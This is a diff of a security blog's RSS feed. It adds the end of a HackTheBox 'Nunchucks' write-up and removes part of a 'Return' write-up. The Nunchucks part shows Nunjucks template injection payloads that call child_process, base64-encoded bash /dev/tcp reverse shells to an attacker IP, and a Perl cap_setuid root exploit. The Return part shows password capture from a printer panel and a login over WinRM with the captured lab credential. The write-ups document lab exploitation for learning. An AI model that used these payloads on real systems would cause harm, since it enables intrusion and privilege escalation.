+<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
+<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
+<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
+<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
+<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
+<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
+<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
+<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
+<span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
+<span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;created_at&#34;</span>:1633378615869
+<span class="s2">&#34;restart_time&#34;</span>:2
+<span class="s2">&#34;unstable_restarts&#34;</span>:0
+<span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
+<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
+<span class="s2">&#34;versioning&#34;</span>:null
+<span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
+<span class="s2">&#34;pm_id&#34;</span>:6
+<span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
+</code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
+→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ cat loot/user.txt
+bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h3 id="shell-as-david">Shell as david</h3>
+<h4 id="tpl-shell">TPL shell</h4>
+<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need code execution!</p>
+<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
+</code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+total 0<span class="se">\n</span>
+</code></pre></div><p>I definitely can execute OS command 😮!</p>
+<h4 id="reverse-shell">Reverse shell</h4>
+<p>I tried to inject my SSH pubkey, but I got asked for a password. Therefore, I will use a bash reverse shell encoded in base64.</p>
+<p>The payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
+</code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+</code></pre></div><p>On my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ nc -nvlp <span class="m">53</span>                                                      
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+david@nunchucks:/var/www/store.nunchucks$ id  
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+david@nunchucks:/var/www/store.nunchucks$
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ls -la
+total <span class="m">16</span>
+drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
+drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
+-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
+drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
+david@nunchucks:/opt$ ls web_backups/ -l
+total <span class="m">14944</span>
+-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
+-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
+</code></pre></div><p>The script code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="ch">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
+<span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+
+<span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
+
+<span class="k">sub</span> <span class="nf">printlog</span>
+<span class="p">{</span>
+    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">sub</span> <span class="nf">archive</span>
+<span class="p">{</span>
+    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
+    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
+<span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
+<span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
+<span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
+<span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
+</code></pre></div><p>When I run it, I found that I didn&rsquo;t fail in the first if statement, which checks for root priv (I guess).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ./backup.pl 
+<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
+<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
+david@nunchucks:/opt$ 
+</code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
+/usr/bin/perl <span class="o">=</span> cap_setuid+ep
+</code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
+<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
+david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
+root
+</code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
+<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ cat .0mochi.pl 
+<span class="c1">#!/usr/bin/perl</span>
+use strict<span class="p">;</span>
+use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
+use DBI<span class="p">;</span>
+use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
+POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 
+
+system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
+david@nunchucks:/tmp$ chmod +x .0mochi.pl 
+</code></pre></div><p>And it worked!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
+root@nunchucks:/tmp# id
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
+</p>
+<p>The flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@nunchucks:/tmp# cat /root/root.txt
+cat /root/root.txt
+1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div>]]></content:encoded>
+    </item>
+    
     <item>
       <title>Tplmap Install</title>
       <link>https://fahmifj.github.io/blog/tplmap-install/</link>
@@ -811,364 +1309,6 @@ f04fc...<span class="o">[</span>SNIP<span class="o">]</span>...
 </ol>
 </section>
 ]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Return</title>
-      <link>https://fahmifj.github.io/hackthebox/return/</link>
-      <pubDate>Sun, 24 Oct 2021 09:12:47 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/return/</guid>
-      <description>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&amp;rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&amp;rsquo;s info reveals that it&amp;rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</description>
-      <content:encoded><![CDATA[<p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Abusing network printer</li>
-<li>Abusing Windows Server Operators group</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Netcat</li>
-<li><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">ACL-FullControl.ps1</a></li>
-<li><a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">ACL-RevokeFullControl.ps1</a></li>
-<li><a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare LPE</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.13» 
-$ fscan 10.10.11.108 <span class="k">return</span>
-nmap -p- 10.10.11.108 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
-nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 18:48 EDT
-Nmap scan report <span class="k">for</span> 10.10.11.108
-Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-<span class="p">|</span> http-methods: 
-<span class="p">|</span>_  Potentially risky methods: TRACE
-<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
-<span class="p">|</span>_http-title: HTB Printer Admin Panel
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-10-15 23:14:10Z<span class="o">)</span>
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Not Found
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49671/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  msrpc         Microsoft Windows RPC
-49676/tcp open  msrpc         Microsoft Windows RPC
-49688/tcp open  msrpc         Microsoft Windows RPC
-59797/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-<span class="p">|</span>_clock-skew: 25m20s
-<span class="p">|</span> smb2-security-mode: 
-<span class="p">|</span>   2.02: 
-<span class="p">|</span>_    Message signing enabled and required
-<span class="p">|</span> smb2-time: 
-<span class="p">|</span>   date: 2021-10-15T23:15:10
-<span class="p">|</span>_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.44 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>On SMB, anonymous login is allowed, but there is no share available.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ smbclient -N -L //10.10.11.108/
-Anonymous login successful
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-SMB1 disabled -- no workgroup available
-</code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.11.108                                                     
-rpcclient $&gt; srvinfo
-Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
-rpcclient $&gt; enumdomusers 
-result was NT_STATUS_ACCESS_DENIED
-</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
-<p>Without creds, there is no hope here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class="s2">&#34;dc=return,dc=local&#34;</span>
-Operations error <span class="o">(</span>1<span class="o">)</span>
-Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
-</code></pre></div><h3 id="tcp-80---printer-panel">TCP 80 - Printer Panel</h3>
-<p>A printer admin panel for managing printer is shown on port 80.</p>
-<p><div class="img-container"><img src="imgs/image-20211017015705468.png" alt="image-20211017015705468"  /></div>
-</p>
-<p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p>
-<p><div class="img-container"><img src="imgs/image-20211017015826808.png" alt="image-20211017015826808"  /></div>
-</p>
-<p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p>
-<p><div class="img-container"><img src="imgs/image-20211017023404252.png" alt="image-20211017023404252"  /></div>
-</p>
-<p>The key takeaway from this is that I was the one who triggered that request.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-svc-printer">Shell as svc-printer</h3>
-<h4 id="capturing-password">Capturing Password</h4>
-<p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p>
-<p><div class="img-container"><img src="imgs/image-20211017022203702.png" alt="image-20211017022203702"  /></div>
-</p>
-<p>The answer is the password pops up on my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ nc -nvlp <span class="m">389</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
-connect to <span class="o">[</span>10.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108<span class="o">]</span> <span class="m">50904</span>
-0*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
-                       1edFg43012!!
-</code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ crackmapexec smb 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span>
-SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
-→ kali@kali «return» «10.10.14.11» 
-$ crackmapexec winrm 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span> 	
-WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
-WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> http://10.10.11.108:5985/wsman
-WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</code></pre></div><h4 id="winrm---svc-printer">WinRM - svc-printer</h4>
-<p>I can login via WinRM and grab the flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «return» «10.10.14.11» 
-$ evil-winrm -i 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p<span class="s1">&#39;1edFg43012!!&#39;</span>
-
-Evil-WinRM shell v2.4
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gci
-
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---       10/14/2021  10:33 PM             <span class="m">34</span> user.txt
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gc user.txt 
-48ba9...<span class="o">[</span>SNIP<span class="o">]</span>...
